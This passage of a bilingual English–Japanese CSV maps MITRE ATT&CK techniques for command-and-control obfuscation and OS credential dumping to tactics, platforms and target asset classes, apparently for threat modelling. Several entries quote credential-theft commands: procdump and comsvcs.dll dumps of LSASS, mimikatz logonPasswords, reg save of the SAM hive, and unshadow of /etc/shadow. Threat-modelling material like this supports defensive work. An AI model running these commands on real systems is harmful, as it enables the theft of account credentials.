Technique_ID,Parent_Technique_ID,Technique_Name,技術名,Description(E),説明(E),Tactics,Platforms,Action_Type,Progression_Role,Environment_Requirements,Req_Status,Target_Asset_Candidates,Knowledge_Attributes,Ito_Steps,Primary_Step,Ito_Category_IDs,Ito_Category_Names,Primary_Ito_Category_ID,Primary_Ito_Category_Name,Ito_Tactic_IDs,STIX_Object_ID,Created,Modified,Applies_To_Asset_Class,Required_Platform_Tags,Required_Capabilities,Required_Keyword_Tags
T1001,,Data Obfuscation,データ難読化,"Adversaries may obfuscate command and control traffic to make it more difficult to detect.(Citation: Bitdefender FunnyDream Campaign November 2020) Command and control (C2) communications are hidden (but not necessarily encrypted) in an attempt to make the content more difficult to discover or decipher and to make the communication less conspicuous and hide commands from being seen. This encompasses many methods, such as adding junk data to protocol traffic, using steganography, or impersonating legitimate protocols.",敵対者は、コマンド＆コントロール通信を難読化して検出を困難にする場合があります（引用元：Bitdefender FunnyDream キャンペーン 2020年11月）。コマンド＆コントロール（C2）通信は、内容を発見または解読しにくくし、通信を目立たなくしてコマンドを見えなくするために、隠蔽（必ずしも暗号化とは限らない）されます。 これには、プロトコルトラフィックへのジャンクデータの追加、ステガノグラフィの使用、正当なプロトコルの偽装など、多くの手法が含まれます。,command-and-control,Linux;macOS;Windows;ESXi,script_command_execution,remote_control,endpoint_execution,specified,Business Workstation;Server (On-Prem/VM),has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--ad255bfe-a9e6-4b52-a258-8d3462abe842,2017-05-31T21:30:18.931Z,2025-04-15T19:58:57.412Z,,,,
T1001.001,T1001,Junk Data,ジャンクデータ,"Adversaries may add junk data to protocols used for command and control to make detection more difficult.(Citation: FireEye SUNBURST Backdoor December 2020) By adding random or meaningless data to the protocols used for command and control, adversaries can prevent trivial methods for decoding, deciphering, or otherwise analyzing the traffic. Examples may include appending/prepending data with junk characters or writing junk characters between significant characters.",攻撃者は、コマンド＆コントロールに使用されるプロトコルにジャンクデータを追加し、検出を困難にすることがあります。(引用元: FireEye SUNBURST Backdoor 2020年12月)コマンド＆コントロールに使用されるプロトコルにランダムまたは無意味なデータを追加することで、攻撃者は、トラフィックのデコード、解読、その他の分析を行う単純な手法を妨げることができます。例としては、ジャンク文字でデータを追加/前置したり、重要な文字の間にジャンク文字を書き込んだりすることが挙げられます。,command-and-control,Linux;macOS;Windows;ESXi,script_command_execution,remote_control,endpoint_execution,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--f7c0689c-4dbd-489b-81be-7cb7c7079ade,2020-03-15T00:30:25.444Z,2025-04-15T19:59:22.822Z,,,,
T1001.002,T1001,Steganography,ステガノグラフィ,"Adversaries may use steganographic techniques to hide command and control traffic to make detection efforts more difficult. Steganographic techniques can be used to hide data in digital messages that are transferred between systems. This hidden information can be used for command and control of compromised systems. In some cases, the passing of files embedded using steganography, such as image or document files, can be used for command and control.",攻撃者は、コマンド＆コントロール通信を隠蔽し検知を困難にするため、ステガノグラフィ技術を用いる可能性がある。ステガノグラフィ技術は、システム間で転送されるデジタルメッセージ内にデータを隠蔽するために使用される。この隠された情報は、侵害されたシステムのコマンド＆コントロールに利用される。場合によっては、画像ファイルや文書ファイルなどステガノグラフィで埋め込まれたファイルの受け渡し自体が、コマンド＆コントロールに利用されることもある。,command-and-control,Linux;macOS;Windows;ESXi,script_command_execution,remote_control,endpoint_execution;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--eec23884-3fa1-4d8a-ac50-6f104d51e235,2020-03-15T00:37:58.963Z,2025-04-25T14:48:29.907Z,,,,
T1001.003,T1001,Protocol or Service Impersonation,プロトコルまたはサービスのなりすまし,"Adversaries may impersonate legitimate protocols or web service traffic to disguise command and control activity and thwart analysis efforts. By impersonating legitimate protocols or web services, adversaries can make their command and control traffic blend in with legitimate network traffic. Adversaries may impersonate a fake SSL/TLS handshake to make it look like subsequent traffic is SSL/TLS encrypted, potentially interfering with some security tooling, or to make the traffic look like it is related with a trusted entity. Adversaries may also leverage legitimate protocols to impersonate expected web traffic or trusted services. For example, adversaries may manipulate HTTP headers, URI endpoints, SSL certificates, and transmitted data to disguise C2 communications or mimic legitimate services such as Gmail, Google Drive, and Yahoo Messenger.(Citation: ESET Okrum July 2019)(Citation: Malleable-C2-U42)",攻撃者は、正当なプロトコルやWebサービストラフィックを偽装し、C&C活動を隠蔽して分析を妨害する可能性がある。正当なプロトコルやWebサービスを偽装することで、攻撃者はC&Cトラフィックを正当なネットワークトラフィックに紛れ込ませることができる。 攻撃者は偽のSSL/TLSハンドシェイクを偽装し、後続のトラフィックがSSL/TLSで暗号化されているように見せかけることで、一部のセキュリティツールの動作を妨害したり、トラフィックを信頼できるエンティティに関連付けられたように見せたりすることがあります。 攻撃者はまた、正当なプロトコルを利用して、予想されるWebトラフィックや信頼されたサービスを偽装することもある。例えば、攻撃者はHTTPヘッダー、URIエンドポイント、SSL証明書、送信データを操作して、C2通信を偽装したり、Gmail、Google Drive、Yahoo Messengerなどの正当なサービスを模倣したりする。(引用: ESET Okrum 2019年7月)(引用: Malleable-C2-U42),command-and-control,Linux;Windows;macOS;ESXi,script_command_execution,remote_control,endpoint_execution;network_connectivity;email_infrastructure,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--c325b232-d5bc-4dde-a3ec-71f3db9e8adc,2020-03-15T00:40:27.503Z,2025-04-15T19:59:05.377Z,,,,
T1002,,Data Compressed,データ圧縮,"An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network. The compression is done separately from the exfiltration channel and is performed using a custom program or algorithm, or a more common compression library or utility such as 7zip, RAR, ZIP, or zlib.",攻撃者は、収集したデータ（例：機密文書）をネットワーク経由で送信する量を最小化し、持ち運び可能にするため、漏洩前に圧縮する場合がある。圧縮は漏洩経路とは別に行われ、カスタムプログラムやアルゴリズム、あるいは7zip、RAR、ZIP、zlibなどの一般的な圧縮ライブラリやユーティリティを使用して実施される。,exfiltration,Linux;Windows;macOS,data_collection,data_outflow,network_connectivity,specified,Business Workstation;File Server;My Number Administrative System on GovCloud;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0010,attack-pattern--b9f5dbe2-4c55-4fc5-af2e-d42c1d182ec4,2017-05-31T21:30:19.338Z,2025-04-25T15:16:03.119Z,,,,
T1003,,OS Credential Dumping,OS認証情報ダンプ,"Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password. Credentials can be obtained from OS caches, memory, or structures.(Citation: Brining MimiKatz to Unix) Credentials can then be used to perform [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and access restricted information. Several of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.",攻撃者は、アカウントのログイン情報や認証情報を取得するために、通常ハッシュまたは平文パスワードの形式で認証情報をダンプしようとする。認証情報はOSキャッシュ、メモリ、または構造体から取得可能である（出典: Brining MimiKatz to Unix）。取得した認証情報は[横方向移動](https://attack.mitre.org/tactics/TA0008)の実行や制限付き情報へのアクセスに使用される。 関連するサブテクニックで言及されているツールのいくつかは、攻撃者とプロのセキュリティテスターの両方が使用する場合があります。追加のカスタムツールも存在する可能性があります。,credential-access,Windows;Linux;macOS,credential_abuse,credential_gain,authentication_system;network_connectivity;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--0a3ead4e-6d47-4ccb-854c-a6a4f9d96b22,2017-05-31T21:30:19.735Z,2025-04-15T22:53:37.617Z,,,,
T1003.001,T1003,LSASS Memory,LSASSメモリ,"Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement](https://attack.mitre.org/tactics/TA0008) using [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550). As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system. For example, on the target host use procdump: * <code>procdump -ma lsass.exe lsass_dump</code> Locally, mimikatz can be run using: * <code>sekurlsa::Minidump lsassdump.dmp</code> * <code>sekurlsa::logonPasswords</code> Built-in Windows tools such as `comsvcs.dll` can also be used: * <code>rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID lsass.dmp full</code>(Citation: Volexity Exchange Marauder March 2021)(Citation: Symantec Attacks Against Government Sector) Similar to [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012), the silent process exit mechanism can be abused to create a memory dump of `lsass.exe` through Windows Error Reporting (`WerFault.exe`).(Citation: Deep Instinct LSASS) Windows Security Support Provider (SSP) DLLs are loaded into LSASS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code> and <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014) The following SSPs can be used to access credentials: * Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package. * Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.(Citation: TechNet Blogs Credential Protection) * Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later. * CredSSP: Provides SSO and Network Level Authentication for Remote Desktop Services.(Citation: TechNet Blogs Credential Protection)",攻撃者は、ローカルセキュリティ機関サブシステムサービス（LSASS）のプロセスメモリに保存された認証情報を取得しようとする可能性があります。ユーザーがログオンすると、システムは様々な認証情報を生成し、LSASSプロセスメモリに保存します。 これらの認証情報は、管理者ユーザーまたは SYSTEM によって収集され、[代替認証情報の使用](https://attack.mitre.org/techniques/T1550) による [横方向の移動](https://attack.mitre.org/tactics/TA0008) に利用される可能性があります。 メモリ内手法に加え、LSASSプロセスメモリは標的ホストからダンプし、ローカルシステムで解析可能です。例：標的ホストでprocdumpを使用 * <code>procdump -ma lsass.exe lsass_dump</code> ローカルではmimikatzを以下で実行可能 * <code>sekurlsa::Minidump lsassdump.dmp</code> * <code>sekurlsa::logonPasswords</code> `comsvcs.dll`などのWindows組み込みツールも使用可能: * <code>rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID lsass.dmp full</code>(出典: Volexity Exchange Marauder 2021年3月)(引用元: Symantec Attacks Against Government Sector) [画像ファイル実行オプション注入](https://attack.mitre.org/techniques/T1546/012)と同様に、サイレントプロセス終了メカニズムを悪用し、Windowsエラー報告(`WerFault.exe`)を通じて`lsass.exe`のメモリダンプを作成できる。(引用: Deep Instinct LSASS) Windows セキュリティサポートプロバイダ (SSP) DLL は、システム起動時に LSASS プロセスにロードされます。LSA にロードされると、SSP DLL は、ログオンしているユーザーのドメインパスワードやスマートカードの PIN など、Windows に保存されている暗号化されたパスワードや平文のパスワードにアクセスできるようになります。 SSP構成は2つのレジストリキーに保存される：<code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code> および <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages</code>。 攻撃者はこれらのレジストリキーを改変し、新しいSSPを追加できます。追加されたSSPは、システムの次回起動時、またはAddSecurityPackage Windows API関数が呼び出された際にロードされます。(引用: Graeber 2014) 以下のSSPを使用して認証情報にアクセスできます:* Msv: 対話型ログオン、バッチログオン、サービスログオンはMSV認証パッケージを介して行われます。 * Wdigest: ダイジェスト認証プロトコルは、ハイパーテキスト転送プロトコル（HTTP）および簡易認証セキュリティ層（SASL）交換での使用を目的としています。（引用元: TechNet Blogs Credential Protection）* Kerberos: Windows 2000以降におけるクライアント-サーバ相互ドメイン認証に推奨されます。 * CredSSP: リモートデスクトップサービス向けにシングルサインオン（SSO）とネットワークレベル認証を提供します。（引用元: TechNet Blogs Credential Protection）,credential-access,Windows,credential_abuse,credential_gain,authentication_system;user_interaction;endpoint_execution;network_connectivity;email_infrastructure;cloud_control_plane;file_storage_access;logging_monitoring,specified,AD / Directory Server;Business Workstation;Log / Monitoring Server;Mail / Collaboration;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--65f2d882-3f41-4d48-8a06-29af77ec9f90,2020-02-11T18:41:44.783Z,2025-04-15T22:45:12.834Z,,,,
T1003.002,T1003,Security Account Manager,セキュリティアカウントマネージャー,"Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the <code>net user</code> command. Enumerating the SAM database requires SYSTEM level access. A number of tools can be used to retrieve the SAM file through in-memory techniques: * pwdumpx.exe * [gsecdump](https://attack.mitre.org/software/S0008) * [Mimikatz](https://attack.mitre.org/software/S0002) * secretsdump.py Alternatively, the SAM can be extracted from the Registry with Reg: * <code>reg save HKLM\sam sam</code> * <code>reg save HKLM\system system</code> Creddump7 can then be used to process the SAM database locally to retrieve hashes.(Citation: GitHub Creddump7) Notes: * RID 500 account is the local, built-in administrator. * RID 501 is the guest account. * User accounts start with a RID of 1,000+.","攻撃者は、メモリ内技術またはSAMデータベースが保存されているWindowsレジストリを通じて、セキュリティアカウントマネージャー（SAM）データベースから認証情報を抽出しようとする可能性があります。SAMは、ホストのローカルアカウント（通常は<code>net user</code>コマンドで確認できるもの）を含むデータベースファイルです。SAMデータベースの列挙にはSYSTEMレベルのアクセス権限が必要です。 インメモリ手法でSAMファイルを取得するツールには以下があります：* pwdumpx.exe* [gsecdump](https://attack.mitre.org/software/S0008)* [Mimikatz](https://attack.mitre.org/software/S0002) * secretsdump.py あるいは、レジストリから Reg を使用して SAM を抽出することも可能です： * <code>reg save HKLM\sam sam</code> * <code>reg save HKLM\system system</code> その後、Creddump7 を使用して SAM データベースをローカルで処理し、ハッシュを取得できます。(引用元: GitHub Creddump7) 注記: * RID 500 アカウントはローカルの組み込み管理者アカウントです。 * RID 501 はゲストアカウントです。 * ユーザーアカウントは RID 1,000 以上から始まります。",credential-access,Windows,credential_abuse,credential_gain,authentication_system;privileged_account;user_interaction;endpoint_execution;file_storage_access;database_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--1644e709-12d2-41e5-a60f-3470991f5011,2020-02-11T18:42:07.281Z,2025-04-15T23:04:51.689Z,,,,
T1003.003,T1003,NTDS,NTDS,"Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in <code>%SystemRoot%\NTDS\Ntds.dit</code> of a domain controller.(Citation: Wikipedia Active Directory) In addition to looking for NTDS files on active Domain Controllers, adversaries may search for backups that contain the same or similar information.(Citation: Metcalf 2015) The following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes. * Volume Shadow Copy * secretsdump.py * Using the in-built Windows tool, ntdsutil.exe * Invoke-NinjaCopy",攻撃者は、資格情報窃取やドメインメンバー（デバイス、ユーザー、アクセス権限など）に関する情報取得を目的として、Active Directoryドメインデータベースへのアクセスやそのコピー作成を試みる可能性があります。デフォルトでは、NTDSファイル（NTDS.dit）はドメインコントローラーの<code>%SystemRoot%\NTDS\Ntds.dit</code>に配置されています。(出典: Wikipedia Active Directory) アクティブなドメイン コントローラー上の NTDS ファイルを探すことに加え、攻撃者は同じまたは類似の情報を含むバックアップを検索する場合があります。(出典: Metcalf 2015) 以下のツールと手法を使用して、NTDS ファイルおよび Active Directory ハッシュ全体の内容を列挙できます。 * ボリュームシャドウコピー * secretsdump.py * Windows組み込みツール ntdsutil.exe の使用 * Invoke-NinjaCopy,credential-access,Windows,credential_abuse,credential_gain,authentication_system;privileged_account;user_interaction;file_storage_access;database_access,specified,AD / Directory Server;Backup Server;Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--edf91964-b26e-4b4a-9600-ccacd7d7df24,2020-02-11T18:42:35.572Z,2025-04-15T19:59:19.862Z,,,,
T1003.004,T1003,LSA Secrets,LSAシークレット,"Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts.(Citation: Passcape LSA Secrets)(Citation: Microsoft AD Admin Tier Model)(Citation: Tilbury Windows Credentials) LSA secrets are stored in the registry at <code>HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets</code>. LSA secrets can also be dumped from memory.(Citation: ired Dumping LSA Secrets) [Reg](https://attack.mitre.org/software/S0075) can be used to extract from the Registry. [Mimikatz](https://attack.mitre.org/software/S0002) can be used to extract secrets from memory.(Citation: ired Dumping LSA Secrets)",ホストへの SYSTEM アクセス権を持つ攻撃者は、サービスアカウントの認証情報など、様々な認証情報を含むローカルセキュリティ機関（LSA）のシークレットへのアクセスを試みる可能性があります。(引用: Passcape LSA Secrets)(引用: Microsoft AD Admin Tier Model)(引用: Tilbury Windows Credentials) LSAシークレットはレジストリの<code>HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets</code>に保存される。LSAシークレットはメモリからもダンプ可能。(引用: ired LSAシークレットのダンプ) [Reg](https://attack.mitre.org/software/S0075)はレジストリからの抽出に使用できます。[Mimikatz](https://attack.mitre.org/software/S0002)はメモリからのシークレット抽出に使用できます。(引用: ired LSAシークレットのダンプ),credential-access,Windows,credential_abuse,credential_gain,authentication_system;cloud_control_plane,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--1ecfdab8-7d59-4c98-95d4-dc41970f57fc,2020-02-21T16:22:09.493Z,2025-04-15T22:44:50.491Z,,,,
T1003.005,T1003,Cached Domain Credentials,キャッシュされたドメイン認証情報,"Adversaries may attempt to access cached domain credentials used to allow authentication to occur in the event a domain controller is unavailable.(Citation: Microsoft - Cached Creds) On Windows Vista and newer, the hash format is DCC2 (Domain Cached Credentials version 2) hash, also known as MS-Cache v2 hash.(Citation: PassLib mscache) The number of default cached credentials varies and can be altered per system. This hash does not allow pass-the-hash style attacks, and instead requires [Password Cracking](https://attack.mitre.org/techniques/T1110/002) to recover the plaintext password.(Citation: ired mscache) On Linux systems, Active Directory credentials can be accessed through caches maintained by software like System Security Services Daemon (SSSD) or Quest Authentication Services (formerly VAS). Cached credential hashes are typically located at `/var/lib/sss/db/cache.[domain].ldb` for SSSD or `/var/opt/quest/vas/authcache/vas_auth.vdb` for Quest. Adversaries can use utilities, such as `tdbdump`, on these database files to dump the cached hashes and use [Password Cracking](https://attack.mitre.org/techniques/T1110/002) to obtain the plaintext password.(Citation: Brining MimiKatz to Unix) With SYSTEM or sudo access, the tools/utilities such as [Mimikatz](https://attack.mitre.org/software/S0002), [Reg](https://attack.mitre.org/software/S0075), and secretsdump.py for Windows or Linikatz for Linux can be used to extract the cached credentials.(Citation: Brining MimiKatz to Unix) Note: Cached credentials for Windows Vista are derived using PBKDF2.(Citation: PassLib mscache)",攻撃者は、ドメイン コントローラーが利用できない場合に認証を可能にするために使用されるキャッシュされたドメイン認証情報へのアクセスを試みる可能性があります。(引用元: Microsoft - Cached Creds) Windows Vista 以降では、ハッシュ形式は DCC2 (Domain Cached Credentials version 2) ハッシュ、別名 MS-Cache v2 ハッシュです。(引用元: PassLib mscache) デフォルトのキャッシュされた認証情報の数はシステムごとに異なり、変更される可能性があります。 このハッシュ形式ではハッシュ転送攻撃は不可能であり、平文パスワードの復元には[パスワードクラッキング](https://attack.mitre.org/techniques/T1110/002)が必要となります。（出典: ired mscache） Linuxシステムでは、Active Directory認証情報はSystem Security Services Daemon (SSSD) やQuest Authentication Services（旧称VAS）などのソフトウェアが管理するキャッシュ経由でアクセス可能です。キャッシュされた認証情報ハッシュは通常、SSSDの場合は`/var/lib/sss/db/cache.[domain].ldb`、Questの場合は`/var/opt/quest/vas/authcache/vas_auth.vdb`に配置されます。 攻撃者は`tdbdump`などのユーティリティを用いてこれらのデータベースファイルからキャッシュされたハッシュをダンプし、[パスワードクラッキング](https://attack.mitre.org/techniques/T1110/002)によって平文パスワードを取得できます。（引用元: Brining MimiKatz to Unix） SYSTEM または sudo アクセス権があれば、[Mimikatz](https://attack.mitre.org/software/S0002)、[Reg](https://attack.mitre.org/software/S0075)、Windows 用 secretsdump.py や Linux 用 Linikatz などのツール/ユーティリティを使用して、キャッシュされた認証情報を抽出できます。(引用: Brining MimiKatz to Unix) 注: Windows Vista のキャッシュされた認証情報は PBKDF2 を使用して導出されます。(引用: PassLib mscache),credential-access,Windows;Linux,credential_abuse,credential_gain,authentication_system;file_storage_access;database_access,specified,AD / Directory Server;Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--6add2ab5-2711-4e9d-87c8-7a0be8531530,2020-02-21T15:42:25.991Z,2025-04-15T21:55:45.923Z,,,,
T1003.006,T1003,DCSync,DCSync,"Adversaries may attempt to access credentials and other sensitive information by abusing a Windows Domain Controller's application programming interface (API)(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) (Citation: Wine API samlib.dll) to simulate the replication process from a remote domain controller using a technique called DCSync. Members of the Administrators, Domain Admins, and Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data(Citation: ADSecurity Mimikatz DCSync) from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) for use in [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003)(Citation: Harmj0y Mimikatz and DCSync) or change an account's password as noted in [Account Manipulation](https://attack.mitre.org/techniques/T1098).(Citation: InsiderThreat ChangeNTLM July 2017) DCSync functionality has been included in the ""lsadump"" module in [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: GitHub Mimikatz lsadump Module) Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol.(Citation: Microsoft NRPC Dec 2017)",攻撃者は、Windows ドメイン コントローラーのアプリケーション プログラミング インターフェイス (API) を悪用して、DCSync と呼ばれる手法を用いてリモート ドメイン コントローラーからレプリケーション プロセスをシミュレートし、認証情報やその他の機密情報にアクセスしようとする可能性があります。(引用: Microsoft DRSR Dec 2017) (引用: Microsoft GetNCCChanges) (引用: Samba DRSUAPI) (引用: Wine API samlib.dll) ドメイン コントローラー上の Administrators、Domain Admins、Enterprise Admin グループのメンバーまたはコンピューター アカウントは、DCSync を実行して Active Directory からパスワード データを取得できます（引用元：ADSecurity Mimikatz DCSync）。これには、KRBTGT や Administrators などの有用なアカウントの現在および過去のハッシュが含まれる可能性があります。 これらのハッシュは、[ゴールデンチケット](https://attack.mitre.org/techniques/T1558/001)の作成に使用され、[チケットパス](https://attack.mitre.org/techniques/T1550/003)に利用される可能性があります。（引用元: Harmj0y Mimikatz and DCSync）または[アカウント操作](https://attack.mitre.org/techniques/T1098)で説明されているようにアカウントのパスワードを変更するために使用できます。(引用元: InsiderThreat ChangeNTLM July 2017) DCSync機能は[Mimikatz](https://attack.mitre.org/software/S0002)の「lsadump」モジュールに組み込まれている。(引用元: GitHub Mimikatz lsadump Module) LsadumpにはNetSyncも含まれており、レガシー複製プロトコル経由でDCSyncを実行します。(引用元: Microsoft NRPC Dec 2017),credential-access,Windows,credential_abuse,credential_gain,authentication_system;identity_federation;privileged_account;endpoint_execution;network_connectivity;cloud_control_plane,specified,AD / Directory Server;Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--f303a39a-6255-4b89-aecc-18c4d8ca7163,2020-02-11T18:45:34.293Z,2025-04-15T22:13:04.812Z,,,,
T1003.007,T1003,Proc Filesystem,Procファイルシステム,"Adversaries may gather credentials from the proc filesystem or `/proc`. The proc filesystem is a pseudo-filesystem used as an interface to kernel data structures for Linux based systems managing virtual memory. For each process, the `/proc/<PID>/maps` file shows how memory is mapped within the process’s virtual address space. And `/proc/<PID>/mem`, exposed for debugging purposes, provides access to the process’s virtual address space.(Citation: Picus Labs Proc cump 2022)(Citation: baeldung Linux proc map 2022) When executing with root privileges, adversaries can search these memory locations for all processes on a system that contain patterns indicative of credentials. Adversaries may use regex patterns, such as <code>grep -E ""^[0-9a-f-]* r"" /proc/""$pid""/maps | cut -d' ' -f 1</code>, to look for fixed strings in memory structures or cached hashes.(Citation: atomic-red proc file system) When running without privileged access, processes can still view their own virtual memory locations. Some services or programs may save credentials in clear text inside the process’s memory.(Citation: MimiPenguin GitHub May 2017)(Citation: Polop Linux PrivEsc Gitbook) If running as or with the permissions of a web browser, a process can search the `/maps` & `/mem` locations for common website credential patterns (that can also be used to find adjacent memory within the same structure) in which hashes or cleartext credentials may be located.","攻撃者は proc ファイルシステムまたは `/proc` から認証情報を収集する可能性があります。proc ファイルシステムは、仮想メモリを管理する Linux ベースのシステムにおいてカーネルデータ構造へのインターフェースとして使用される疑似ファイルシステムです。各プロセスについて、`/proc/<PID>/maps` ファイルはプロセスの仮想アドレス空間内でメモリがどのようにマップされているかを示します。 また、デバッグ目的で公開されている`/proc/<PID>/mem`は、プロセスの仮想アドレス空間へのアクセスを提供します。(引用: Picus Labs Proc cump 2022)(引用: baeldung Linux proc map 2022) ルート権限で実行する場合、攻撃者はシステム上の全プロセスにおいて、認証情報を示すパターンを含むこれらのメモリ位置を検索できます。 攻撃者は正規表現パターン（例: `grep -E ""^[0-9a-f-]* r"" /proc/""$pid""/maps | cut -d' ' -f 1`）を用いて、メモリ構造体やキャッシュされたハッシュ内の固定文字列を検索する可能性がある。(引用元: atomic-red proc file system) 特権アクセスなしで実行されている場合でも、プロセスは自身の仮想メモリ位置を閲覧できる。 一部のサービスやプログラムは、プロセスのメモリ内に認証情報を平文で保存する場合があります。(引用元: MimiPenguin GitHub 2017年5月)(引用元: Polop Linux PrivEsc Gitbook) ウェブブラウザとして、またはウェブブラウザの権限で実行されている場合、プロセスは `/maps` および `/mem` の場所を検索して、ハッシュや平文の認証情報が置かれている可能性のある、一般的なウェブサイト認証情報のパターン（同じ構造内の隣接メモリを見つけるためにも使用可能）を探すことができます。",credential-access,Linux,credential_abuse,credential_gain,authentication_system;privileged_account;endpoint_execution;file_storage_access,specified,Business Workstation;File Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--3120b9fa-23b8-4500-ae73-09494f607b7d,2020-02-11T18:46:24.434Z,2025-04-15T22:57:59.661Z,,,,
T1003.008,T1003,/etc/passwd and /etc/shadow,/etc/passwd および /etc/shadow,"Adversaries may attempt to dump the contents of <code>/etc/passwd</code> and <code>/etc/shadow</code> to enable offline password cracking. Most modern Linux operating systems use a combination of <code>/etc/passwd</code> and <code>/etc/shadow</code> to store user account information, including password hashes in <code>/etc/shadow</code>. By default, <code>/etc/shadow</code> is only readable by the root user.(Citation: Linux Password and Shadow File Formats) Linux stores user information such as user ID, group ID, home directory path, and login shell in <code>/etc/passwd</code>. A ""user"" on the system may belong to a person or a service. All password hashes are stored in <code>/etc/shadow</code> - including entries for users with no passwords and users with locked or disabled accounts.(Citation: Linux Password and Shadow File Formats) Adversaries may attempt to read or dump the <code>/etc/passwd</code> and <code>/etc/shadow</code> files on Linux systems via command line utilities such as the <code>cat</code> command.(Citation: Arctic Wolf) Additionally, the Linux utility <code>unshadow</code> can be used to combine the two files in a format suited for password cracking utilities such as John the Ripper - for example, via the command <code>/usr/bin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db</code>(Citation: nixCraft - John the Ripper). Since the user information stored in <code>/etc/passwd</code> are linked to the password hashes in <code>/etc/shadow</code>, an adversary would need to have access to both.",攻撃者は、オフラインでのパスワード解読を可能にするため、<code>/etc/passwd</code> と <code>/etc/shadow</code> の内容をダンプしようとする可能性があります。ほとんどの現代の Linux オペレーティングシステムでは、<code>/etc/passwd</code> と <code>/etc/shadow</code> を組み合わせてユーザーアカウント情報を保存しており、パスワードハッシュは <code>/etc/shadow</code> に格納されます。 デフォルトでは、<code>/etc/shadow</code> は root ユーザーのみが読み取り可能です。(引用元: Linux Password and Shadow File Formats) Linux は、ユーザー ID、グループ ID、ホームディレクトリパス、ログインシェルなどのユーザー情報を <code>/etc/passwd</code> に保存します。システム上の「ユーザー」は、個人またはサービスに属する場合があります。 すべてのパスワードハッシュは<code>/etc/shadow</code>に保存されます。これにはパスワードを持たないユーザーや、ロックまたは無効化されたアカウントのエントリも含まれます。(引用元: Linux Password and Shadow File Formats) 